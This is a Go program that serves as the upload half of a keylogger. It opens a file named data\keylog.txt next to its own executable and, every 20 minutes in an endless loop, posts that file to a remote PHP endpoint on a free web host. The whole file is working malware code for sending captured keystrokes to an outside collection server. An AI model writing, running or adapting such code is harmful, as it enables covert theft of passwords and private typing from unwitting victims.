package main

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

func main() {
	// Path to the file you want to upload

	// t := time.Now()
	// fmt.Print(t.Add(1 * time.Hour))

	exePath, err := os.Executable()
	if err != nil {
		fmt.Println(err)
		return
	}

	// Get the absolute path
	exePath, err = filepath.Abs(exePath)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Get the directory of the executable

	exeDir := filepath.Dir(exePath)
	filePath := exeDir + "\\data\\keylog.txt"

	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("Failed to open file: %v\n", err)
		return
	}
	defer file.Close()
	for {
		time.Sleep(20 * time.Minute)
		// Create a buffer to hold the multipart form data
		var requestBody bytes.Buffer
		writer := multipart.NewWriter(&requestBody)

		// Create a form file field
		part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
		if err != nil {
			fmt.Printf("Failed to create form file: %v\n", err)
			return
		}

		// Copy the file content to the form file field
		_, err = io.Copy(part, file)
		if err != nil {
			fmt.Printf("Failed to copy file content: %v\n", err)
			return
		}

		// Close the multipart writer to set the terminating boundary
		err = writer.Close()
		if err != nil {
			fmt.Printf("Failed to close writer: %v\n", err)
			return
		}

		// Create a new POST request with the multipart form data
		req, err := http.NewRequest("POST", "https://passless-paint.000webhostapp.com/save_data.php", &requestBody)
		if err != nil {
			fmt.Printf("Failed to create request: %v\n", err)
			return
		}

		// Set the Content-Type header to multipart/form-data with the correct boundary
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// Send the request
		client := &http.Client{}
		fmt.Println(req)

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Failed to send request: %v\n", err)
			return
		}
		defer resp.Body.Close()

		// Check the response status
		if resp.StatusCode != http.StatusOK {
			fmt.Printf("Request failed with status: %s\n", resp.Status)
			return
		}

		// Read the response body
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Failed to read response body: %v\n", err)
			return
		}

		// Print the response
		fmt.Println("Response:", string(respBody))
	}
}
